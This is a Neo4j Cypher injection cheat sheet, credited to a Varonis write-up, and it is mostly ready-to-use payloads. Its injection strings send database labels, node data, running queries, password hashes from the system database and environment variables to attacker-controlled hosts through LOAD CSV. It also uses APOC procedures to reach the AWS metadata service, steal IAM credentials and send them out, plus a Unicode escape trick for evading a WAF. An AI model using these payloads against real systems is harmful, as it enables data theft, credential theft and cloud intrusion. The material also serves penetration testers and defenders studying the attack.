---
title: Neo4j (cypher) Injections ☎️
---
> *Credits to [varonis.com](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits)*

## Cypher

Cypher is Neo4j's graph query language that lets you retrieve data from the graph. It uses “an ASCII-art type of syntax,” in which rounded brackets are used to represent nodes and square brackets represent relationships. If that sounds familiar, it's inspired by SQL (according to Neo4j).

```sql
MATCH (a: Actor)-[:actedIn]->(m: Movie)<-[:directedBy]-(d:Director) 

RETURN a, m, d
```

Unlike SQL, Cypher supports parameters at the protocol level. But there are restrictions to parameters. For example, labels ― which are the tags used to classify nodes and relationships (Actor, actedIn, Movie, Director, and directedBy in our example above ― cannot be parameters, even though they are dynamic.

### Filter data

Like SQL, one can filter data using WHERE.

**For example:**

```sql
MATCH (a: Actor)-[:actedIn]->(m: Movie)<-[:directedBy]-(d:Director) 

WHERE a.name = 'Olivia Colman' 

RETURN a, m, d 
```

But there's another very common way to filter results in the MATCH statement itself:

```sql
MATCH (a: Actor {name:‘Olivia Colman'})-[:actedIn]->(m: Movie)<-[:directedBy]-(d:Director) 

RETURN a, m, d 
```

The main difference is that WHERE is much more versatile and supports advanced logics, such as OR, IN, RegExes and more.

### Union

Like SQL, Cypher supports UNION statements, which let you concatenate the results of different queries together, so long as they have the same columns. The way the data is retrieved does not matter, as long as the columns have the same names:

```sql
MATCH (a: Actor) RETURN a.name UNION RETURN 'some name' as name 
```

### Advanced

Cypher supports more advanced logic in the form of procedures and functions.

**Procedures** — generate data. Used only in a “CALL” statement. For example, list all labels.

**Functions** — manipulate data. For example, determine the length of a list. Unlike procedures, they return a single value. Can be used anywhere where expressions are allowed, such as WITH statements, as well as WHERE and RETURN.

```sql
CALL db.labels() YIELD label RETURN label 
WITH [1,2,3] as l RETURN size(l) 
```

### Parameters

Neo4j supports providing parameters to queries. Parameters let developers pass input safely, separately from the query, so injections are not possible.

The parameters are passed to the server by the client separately from the query itself and can have different value types, such as string, list, int, bool, or a map.

In the query, parameters are referred to using the dollar sign ($).

Parameters are a great way for developers to avoid injections, but there are limitations to parameters. For example, they cannot be used to denote labels or field names.

## Injections

### How to inject

Injections can be found anywhere in the query. Naturally, the MATCH and WHERE statements are common scenarios.

When we have found an injection, the way to exploit it depends on the location within the query. Below is a table of different injection locations and exploitation examples:

|Injectable query|Injection|
|---|---|
|`MATCH (o) WHERE o.Id='{input}'`|`' OR 1=1 WITH 0 as _l00 {…} RETURN 1 //`|
|`MATCH (o) WHERE '{input}' = o.Id   MATCH (o) WHERE {input} in [different, values]`|`'=' {…} WITH 0 as _l00 RETURN 1 //`|
|`MATCH (o) WHERE o:{input}`|`a {…} WITH 0 as _l00 RETURN 1 //`|
|`` MATCH (o) WHERE o:`{input}` ``|``a` {...} WITH 0 as _l00 RETURN 1 //``|
|`MATCH (o {id:'{input}'})`|`'}) RETURN 1 UNION MATCH (n) {...} RETURN 1 //`|
|`MATCH (o:{input})`|`a) RETURN 1 UNION MATCH (n){...} RETURN 1//`|
|``MATCH (o:`{input}`)``|``a`) RETURN 1 UNION MATCH (n){...} RETURN 1 //``|
|`MATCH (o)-[r {id:'{input}'})]-(o2)`|`'}]-() RETURN 1 UNION MATCH (n){...} RETURN 1//`|
|`MATCH (o)-[r:{input}]-(o2)`|`a]-() RETURN 1 UNION MATCH (n){...} RETURN 1 //`|
|``MATCH (o)-[r:`{input}`]-(o2)``|``a`]-() RETURN 1 UNION MATCH (n){...} RETURN 1 //``|

Note the UNION statement:

1. The reason UNION is required is that if the MATCH statement doesn't return anything, the rest of the query won't run. So, all the nefarious things we might do there will simply not execute.
2. We add “RETURN 1” before the UNION so both parts return the same columns, which is required for the query to execute.

So, what's with the “WITH” statement?

Using WITH, we can drop all existing variables. This is important when we don't know what the query is (more on that later). If our payload accidentally tries to set a variable that already exists, the query will fail to run.

Naturally, if we know the query and the database, none of these techniques are required. We can even manipulate the returned data to in turn manipulate the process instead of just abusing the server.

## Post exploitation

### HTTP LOAD CSV

Also mentioned in other articles, but which bears repeating, LOAD CSV is a built-in statement that can be used to exfiltrate data. LOAD CSV tries to load a csv either from the filesystem or from the web. Filesystem access is usually restricted unless the restrictions were explicitly lifted in the configuration file (which is unlikely to be the case).

But an attacker can use the web functionality to exfiltrate data. If the vulnerable query is:

```sql
MATCH (o) WHEREo.Id='{input}' RETURN o  
```

then the attacker can inject the following string:

```plaintext
' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 // 
```

This will send all the installed procedures in the database to the attacker's server.

## APOC

The first thing an attacker should check is whether APOC is installed. APOC (awesome procedures on Cypher) is an extremely popular, officially supported plugin for Neo4j that greatly enhances its capabilities. APOC adds many additional functions and procedures that developers can use in their environment, but therein lies the problem: more power for the developer means more power for the attacker. Attackers can use the various procedures and functions APOC offers to carry out more advanced attacks.

APOC offers functions that can prove useful for injections. These functions can serialize and encode data, making it much easier to exfiltrate sensitive content.

- apoc.convert.toJson — converts nodes, maps, and more to JSON
- apoc.text.base64Encode — gets a string and encodes it as base64

Much more interesting are the procedures that APOC offers. They are a game-changer for attackers. HTTP:

```sql
apoc.load.jsonParams 

apoc.load.csvParams 
```

And many more — we will discuss them later in the article

Also, interesting are procedures and functions that let you evaluate queries, among them:

- apoc.cypher.runFirstColumnMany — a function that returns the values of the first column as a list
- apoc.cypher.runFirstColumnSingle — a function that returns the first value of the first column
- apoc.cypher.run — a procedure that runs a query and returns the results as a map
- apoc.cypher.runMany — a procedure that runs a query or multiple queries separated by a semicolon and returns the results as a map. The queries run in a different transaction.

Using the load.*params procedures, an attacker can specify headers, request data, and use different methods other than GET.

### apoc.load.jsonParams

**Arguments:**

|Name|Type|Example|Is required|
|---|---|---|---|
|urlOrKeyorBinary|Any|"http://attacker.com/json"|Yes|
|headers|Map or null|{ method: "POST", `Authorization`:"BEARER " + hacked_token}|Yes|
|payload|String or null|Data|Yes|
|path|String or null|Data|No|
|config|Map or null|Null|No|

- **urlOrKeyORBinary** — We'll usually want a URL, but it's also possible to specify the binary data of a JSON.
- **headers** — Except for http headers, we can also use this field to specify the method.  
    Important! At the time of writing, if we want to issue a get request, we must not specify a method. `method`: “GET” will not work, because of a bug in the implementation.
- **payload** — If we want to send a GET request, this must be null.
- **path** — If we only want a specific value in the JSON response from the invoked endpoint, we can use this to argument to only retrieve the value of that field.
- **config** — Additional configuration parameters for the query. For example, we can tell APOC the retrieved data is compressed like so:  
    {compression: 'DEFLTA'}

**Return values:**

|Name|Description|Type|Example|
|---|---|---|---|
|value|The parsed JSON|MAP|{"Hello": "World"}|

### apoc.load.csvParams

Note: in Neo4j 5, this procedure was moved to APOC extended

**Arguments:**

|Name|Type|Example|Is Required|
|---|---|---|---|
|urlOrKeyorBinary|Any|"http://attacker.com/json"|Yes|
|headers|Map or null|{ method: "POST", `Authorization`:"BEARER " + hacked_token}|Yes|
|payload|String or null|Data|Yes|
|config|Map or null|{header: FALSE}|No|

- **urlOrKeyORBinary** – we will usually want a URL, but it also possible to specify the binary data of a csv
- **headers** – except for http headers, we can also use this field to specify the method.
    
    Important! If want a get request, we MUST NOT specify a method. `method`: “GET” will not work, due to a bug in the implementation.
    
- **payload** – If we want to send a GET request, this must be null
- **config** – We can use config for example to tell APOC the data is compressed. For example:
    
    {compression: ‘DEFLTA'}
    
    We can also use config to change the delimiter, the quote char, escape char, array separator, skip lines, or whether the CSV has a header line or not
    

**Return values:**

|Name|Description|Type|Example|
|---|---|---|---|
|lineNo|The line number of the value|Integer|0|
|list|List of values in a row|List⟨string⟩|["a","b","c"]|
|map|If headers are present, map will map the header with the value|Map|{"A: "a"}|

**Examples:**

```sql
CALL apoc.load.jsonParams("http://victim.internal/api/user",{ method: "POST", `Authorization`:"BEARER " + hacked_token},'{"name":"attacker", "password":"rockyou1"}',"") yield value as value 

CALL apoc.load.csvParams("http://victim.internal/api/me",{ `Authorization`:"BEARER " + hacked_token}, null,{header:FALSE}) yield list 
```

## Extracting data from Neo4j

There are many built-in and APOC functions that can help us get information about the database.

### Get labels

Using the built-in method db.labels, it is possible to list all existing labels.

**Arguments:** None

**Return values:**

|Name|Description|Type|Example|
|---|---|---|---|
|label|Names of the labels|Rows of strings|Actor  <br>Movie|

**Injection example:**

```plaintext
'}) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://attacker_ip /?l='+label as l RETURN 0 as _0 
```

### Get the properties of a node and their values

The built-in function keys can be used to list the keys of the properties.

**Arguments:**

- A node or a map

**Return value:**

- The keys of the node/map

It's possible to retrieve the value of a property from the node if you treat it as a map: n[key], so we can use LOAD CSV to exfiltrate the data. Be sure to use toString.

**Injection example:**

```plaintext
' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 // 
```

Warning: This won't work if one of the fields is a list or a map.

If APOC is available, there's a better way to do it using apoc.convert.toJson

```plaintext
' OR 1=1 WITH 0 as _0 MATCH (n) LOAD CSV FROM 'http://10.0.2.4:8000/?' + apoc.convert.toJson(n) AS l RETURN 0 as _0 // 
```

**Arguments:** Anything

**Return value:**

- String — the JSON representation of the input

```plaintext
'}) RETURN 0 as _0 UNION MATCH (f:Flag)  LOAD CSV FROM 'http://10.0.2.4:8000/?json='+apoc.convert.toJson(f) as l RETURN 0 as _0 // 
```

### Get the server version

One way to get the server version is to use the procedure dbms.components()

**Arguments:** none

**Return value:**

|Name|Description|Type|Example|
|---|---|---|---|
|name|The name of the component|String|Neo4j Kernel|
|versions|A list of versions|List⟨String⟩|[“4.4.10”]|
|edition|The component's edition|String|community|

**Injection example:**

```plaintext
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
```

### Get the running query

### Neo4j 4

There are several ways to get the running query. The easiest one is to use the procedure dmbs.listQueries()

**Arguments:** None

**Return values:** Many, among them:

|Name|Description|Type|Example|
|---|---|---|---|
|query|The query itself|String|MATCH (o) RETURN o|
|username|The name of the user that has executed the query|String|Neo4j_user|
|parameters|The parameters with which the query is running|Map|main|
|database|The name of the database|String|Neo4j|

**Injection example:**

```plaintext
' OR 1=1 call dbms.listQueries() yield query LOAD CSV FROM 'http://10.0.2.4:8000/?' + query as l RETURN 1 // 
```

### Neo4j 5

Dbms.listQueries was removed. Instead, we can use “SHOW TRANSACTIONS”. There are two major limitations:

SHOW queries are not injectable

Unlike listQueries, we can only see the currently executed query in the transaction and not all of them.

If APOC core is installed, we can use it to run SHOW TRANSACTIONS. If we run in the same transaction, only SHOW TRANSACTIONS will be returned instead of the query we are trying to see. We can use apoc.cypher.runMany to execute SHOW TRANSACTIONS, because unlike other apoc.cypher functions and procedures, it runs in a different transaction.

```plaintext
' OR 1=1 call apoc.cypher.runMany("SHOW TRANSACTIONS yield currentQuery RETURN currentQuery",{}) yield result LOAD CSV FROM 'http://10.0.2.4:8000/?' + result['currentQuery'] as l RETURN 1// 
```

## List all functions and methods

### Neo4j 4

Using the built-in procedures dbms.functions() and dbms.procedures() it's possible to list all functions and procedures.

Both do not get parameters and share the following return values:

|Name|Description|Type|Example|
|---|---|---|---|
|name|The name of the function or procedure|String|abs|
|signature|The signature — how to call it and return values|String|"abs(input :: INTEGER?) :: (INTEGER?)"|
|description|Describes what the function/procedure does|String|"Returns the absolute value of an integer."|

There are other return values that are less relevant to this article.

**Injection examples:**

```plaintext
' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 // 
```

```plaintext
' OR 1=1 WITH 1 as _l00 CALL dbms.functions() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 // 
```

### Neo4j 5

These procedures were removed in Neo4j 5 and were already considered deprecated (but they worked) in Neo4j 4.

Instead, we can use SHOW PROCEDURES and SHOW FUNCTIONS

Show queries cannot be injected.

If APOC core is installed, we can use any of the procedures or functions that execute queries to list functions and procedures.

```plaintext
' OR 1=1 WITH apoc.cypher.runFirstColumnMany("SHOW FUNCTIONS YIELD name RETURN name",{}) as names UNWIND names AS name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 // 
```

```plaintext
' OR 1=1 CALL apoc.cypher.run("SHOW PROCEDURES yield name RETURN name",{}) yield value 

 LOAD CSV FROM 'https://attacker.com/' + value['name'] as _l RETURN 1 // 
```

### Get system database (including password hashes)

The system database is a special Neo4j database that is not normally queryable. It contains interesting data stored as nodes:

- Databases
- Roles
- Users (including the hash of the password!)

Using APOC, it's possible to retrieve the nodes, including the hashes. Only admins can do this, but in the free edition of Neo4j, there's only an admin user and no other users, so it's not uncommon to find yourself running as an admin.

Use the procedure apoc.systemdb.graph() to retrieve the data.

**Arguments:** None

**Return values:**

|Name|Type|Description|
|---|---|---|
|Nodes|List⟨Node⟩|The nodes in the database|
|Relationships|List⟨Relationship⟩|The relationships in the database|

Neo4j works in an unexpected way with such nodes: if you just return the nodes, you can see their data. But if you try to get a specific field, this won't work. That's because Neo4j will look for the node ID and will return the field from the node with the same ID in the current database.

One solution is to use the function apoc.convert.toJson(), which gets any input and converts it to JSON.

**Injection example:**

```plaintext
' OR 1=1 WITH 1 as a  call apoc.systemdb.graph() yield nodes LOAD CSV FROM 'http://10.0.2.4:8000/?nodes=' + apoc.convert.toJson(nodes) as l RETURN 1 //  
```

**Notes:** In Neo4j5, the procedures were moved to APCO extended.

### The hash

Neo4j uses SimpleHash by Apache Shiro to generate the hash.

Below is a pseudo-code (AKA python) of the hashing process:

```python
def hash(password, salt, iterations): 

    data = salt+password 

    for i in range(iterations): 

        m = sha256() 

        m.update(data) 

        data = m.digest() 

    return hexlify(data) 
```

The result is stored as a comma-separated values string:

1. Hashing algorithm
2. Hash
3. Salt
4. Iterations

**For example:**

```plaintext
SHA-256, 8a80d3ba24d91ef934ce87c6e018d4c17efc939d5950f92c19ea29d7e88b562c,a92f9b1c571bf00e0483effbf39c4a13d136040af4e256d5a978d265308f7270,1024 
```

**Which means:**

1. The hashing algorithm is SHA256
2. The hash itself is 8a80d3ba24d91ef934ce87c6e018d4c17efc939d5950f92c19ea29d7e88b562c
3. The salt is a92f9b1c571bf00e0483effbf39c4a13d136040af4e256d5a978d265308f7270
4. The number of iterations is 1024 (which is the standard for Neo4j)

The password is, by the way, “Neo4j”. Do not use this password.

### Environment variables

Oftentimes developers and DevOps engineers use environment variables to store secrets, a fact that makes them an interesting target. Additionally, a red-teamer can learn a lot about the target from the environment variable, which may contain crucial information for lateral movement in the victim's network.

Using APOC, it is possible to retrieve the environment variable by using the procedure apoc.config.map() or apoc.config.list().

These procedures can only be used if they are included in the list of unrestricted procedures in the conf file (dbms.security.procedures.unrestricted). This is more common than one might think, and Googling the setting name results in many sites and guides that advise adding the value “apoc.*”, which allows all APOC procedures.

They return the configuration of the server, including java and the OS, which is of course, interesting, but they also return the environment variables.

The two procedures are rather similar. The difference is the return value.

**Arguments:** None

**Return values:**

`apoc.config.list`

|Name|Type|Description|
|---|---|---|
|key|Rows of strings|The name of the configuration value or env var|
|value|Rows of strings|The value of the configuration value or env var|

`apoc.config.map`

|Name|Type|Description|
|---|---|---|
|map|Map|A key-value map|

**Injection example:**

```plaintext
' OR 1=1 CALL apoc.config.list() YIELD key, value LOAD CSV FROM 'http://10.0.2.4:8000/?'+key+"="+" A B C" as l RETURN 1 // 
```

**Note:** in Neo4j5 the procedures were moved to APOC extended.

## Lateral movement in the cloud

In cloud providers such as AWS, GCP, and Azure, the virtual machines have a metadata server that can provide credentials for the cloud.

### AWS

In AWS, the address of the metadata server is 169.254.169.254. There's a lot of information there, but we're focused on credentials. If the instance has an instance-profile, that in turn has a role, and we can get its credentials.

Three values are required:

- AWS_ACCESS_KEY_ID
- AWS_SECRET_ACCESS_KEY
- AWS_SESSION_TOKEN

We need to set these values as environment variables or put them under a profile in the .aws/credentials file, and then we can use AWS cli. For example:

```plaintext
> aws sts get-caller-identity 
```

Or

```plaintext
> aws s3 list 
```

AWS exploitation tools such as Pacu can also use these credentials.

AWS has two metadata server modes: IMDSv1 and IMDSv2. IMDSv2 is the more secure version, but the default configuration is that both versions are active.

### IMDSv1

This is the simplest, less secure but very common, version.

As an attacker, all you need to do is to first GET the following URL:

```plaintext
http://169.254.169.254/latest/meta-data/iam/security-credentials/ 
```

The response is technically a list of roles, though typically there is only one role assigned. Once you know the role, GET the following URL:

```plaintext
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role} 
```

While the format is JSON, we can also use LOAD CSV to make the request.:

```plaintext
LOAD CSV FROM ' http://169.254.169.254/latest/meta-data/iam/security-credentials/' AS roles UNWIND roles AS role LOAD CSV FROM ' http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role as l  
```

The result should look like this:

```plaintext
[{"l":["{"]},{"l":["  \"Code\" : \"Success\"",null]},{"l":["  \"LastUpdated\" : \"2022-08-07T06:23:25Z\"",null]},{"l":["  \"Type\" : \"AWS-HMAC\"",null]},{"l":["  \"AccessKeyId\" : \"ASIAX****WZ\"",null]},{"l":["  \"SecretAccessKey\" : \"xKdQRduW****\"",null]},{"l":["  \"Token\" : \"IQoJb3JpZ2luX2Vj********a==\"",null]} 
```

We know the size and structure of the response, so we can exfiltrate everything:

```sql
LOAD CSV FROM ' http://169.254.169.254/latest/meta-data/iam/security-credentials/' AS roles UNWIND roles AS role LOAD CSV FROM ' http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role as l
  
WITH collect(l) AS _t LOAD CSV FROM 'http://{attacker_ip}/' + substring(_t[4][0],19, 20)+'_'+substring(_t[5][0],23, 40)+'_'+substring(_t[6][0],13, 1044) AS _ 
```

This will send to our server a request that contains first the key, then access key secret, and eventually the access token.

### IMDSv2

IMDSv2 is a more secure version, designed to protect the metadata server from simple Server Side Request Forgeries (SSRFs).

To use the metadata server, the attacker first needs to PUSH to the following URL:

```plaintext
http://169.254.169.254/latest/api/token 
```

The server will return a token that we should put in subsequent calls to the metadata server in the header: X-aws-ec2-metadata-token.

This raises two problems: we need to specify headers and we need to use methods other than GET.

LOAD CSV can't do either of these things, but we can use apoc.load.csvParams to get the token and the role, and then apoc.load.jsonParams to get the credentials themselves. The reason we use csvParams is that the response is not a valid JSON.

To get the token:

```sql
CALL apoc.load.csvParams("http://169.254.169.254/latest/api/token", {method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},"",{header:FALSE}) yield list WITH list[0] as token RETURN token 
```

To get the role and the credentials:

```sql
CALL apoc.load.csvParams("http://169.254.169.254/latest/api/token", {method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},"",{header:FALSE}) yield list WITH list[0] as token 

CALL apoc.load.csvParams("http://169.254.169.254/latest/meta-data/iam/security-credentials/", { `X-aws-ec2-metadata-token`:token},null,{header:FALSE}) yield list UNWIND list as role  

CALL apoc.load.jsonParams("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role,{ `X-aws-ec2-metadata-token`:token },null,"") yield value as value 
```

**Note:** the last two requests are both GET. In order to successfully fire a GET request using apoc.load.*Params, we must not specify a method.

**Note:** procedure apoc.load.csvParams was moved to APOC extended in Neo4j 5.

### Calling commands

It is possible to call AWS commands directly from the Neo4j instance.

AWS uses an XML-based API to perform commands and retrieve information. While there is no apoc.load.xmlParams, it is possible to use apoc.load.csvParams to retrieve XMLs. By changing all the special characters to binary characters that will never show up in a valid xml, we can specify headers and the method and retrieve XMLs.

```sql
CALL apoc.load.csvParams('https://iam.amazonaws.com/?Action=ListUsers&Version=2010-05-08', {`X-Amz-Date`:$date, `Authorization`: $signed_token, `X-Amz-Security-Token`:$token}, null, ) YIELD list 
```

- $data is formatted as %Y%m%dT%H%M%SZ
- $token is the token we got from the metadata server
- $signed_token is calculated according to https://docs.aws.amazon.com/general/latest/gr/signing_aws_api_requests.html

## Tricks

### Unicode injection

In Neo4j >= v4.2.0, it's often possible to inject Unicode using “\uXXXX”. For example, you can use this method if the server tries to remove characters such as: ‘, “, ` and so on.

This may not work if a letter follows the Unicode escape sequence. It's safe to add a space afterward or another Unicode notation.

This is often useful when there's a WAF. But there are other cases, in which this feature enables exploitation. For example, if the server removes single quotes, and the query looks like the following:

```sql
MATCH (a: {name: '$INPUT'}) RETURN a 
```

It is possible to inject:

```sql
\u0027 }) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM "http://attacker/ "+ label RETURN 0 as _o // 
```

